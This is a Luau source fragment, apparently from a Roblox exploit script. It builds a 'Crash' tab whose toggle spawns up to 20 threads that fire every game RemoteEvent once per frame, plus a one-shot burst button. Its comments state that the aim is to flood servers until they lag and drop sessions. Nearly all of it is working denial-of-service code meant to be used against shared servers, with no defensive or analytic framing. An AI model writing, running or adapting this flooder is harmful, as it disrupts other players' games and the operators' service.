-- TAB 2 — 💥 Crash
-- ─────────────────────────────────────────────────────────────────────────
--[[
    How this works:

    When enabled, we spawn N parallel threads (default 8, slider-adjustable).
    Each thread runs a tight while loop with task.wait(0) — yields for exactly
    one frame then fires again immediately. Every thread fires EVERY remote
    in BatRemotes on each iteration.

    The effect: the server receives (threads × remotes × ~60fps) remote calls
    per second simultaneously. Most Roblox servers queue and process these
    synchronously — they choke, lag spikes, eventually drop the session.

    task.wait(0) is the minimum legal yield in Luau (can't have zero yields
    in a hot loop or the scheduler will kill the thread). One frame wait
    is as tight as it physically gets.
]]
local CrashTab = Window:CreateTab("💥 Crash", 4483362458)

CrashTab:CreateSection("Server Crasher")

CrashTab:CreateLabel("Spawns parallel threads that flood EVERY remote")
CrashTab:CreateLabel("simultaneously. More threads = more pain.")

CrashTab:CreateSlider({
    Name         = "Flood Threads",
    Range        = {1, 20},
    Increment    = 1,
    Suffix       = " threads",
    CurrentValue = 8,
    Flag         = "CrashThreads",
    Callback = function(v)
        S.crashThreads = v
    end
})

CrashTab:CreateToggle({
    Name         = "☢️ CRASH SERVER — Flood All Remotes",
    CurrentValue = false,
    Flag         = "CrashToggle",
    Callback = function(v)
        S.crashActive = v

        if v then
            Rayfield:Notify({
                Title   = "☢️ Flooding",
                Content = S.crashThreads .. " threads launched",
                Duration = 3
            })

            -- spawn N independent flood threads
            for i = 1, S.crashThreads do
                task.spawn(function()
                    while S.crashActive do
                        local tool    = findTool()
                        local remotes = getAllRemotes()
                        for _, r in ipairs(remotes) do
                            -- pcall so one dead remote doesn't kill the thread
                            pcall(r.FireServer, r, tool)
                        end
                        task.wait(0) -- minimum legal yield, one frame
                    end
                end)
            end
        end
        -- disabling: S.crashActive = false, each thread checks it and exits
    end
})

CrashTab:CreateSection("One-Shot Burst")

--[[
    Doesn't toggle — fires a single synchronous burst of every remote
    back to back right now, no looping. Good for a quick nuke
    without committing to the flood toggle.
]]
CrashTab:CreateButton({
    Name     = "⚡ One-Shot Burst (All Remotes Now)",
    Callback = function()
        local tool    = findTool()
        local remotes = getAllRemotes()
        local count   = 0
        for _, r in ipairs(remotes) do
            pcall(r.FireServer, r, tool)
            count = count + 1
        end
        Rayfield:Notify({
            Title   = "Burst Fired",
            Content = count .. " remotes hit",
            Duration = 2
        })
    end
})

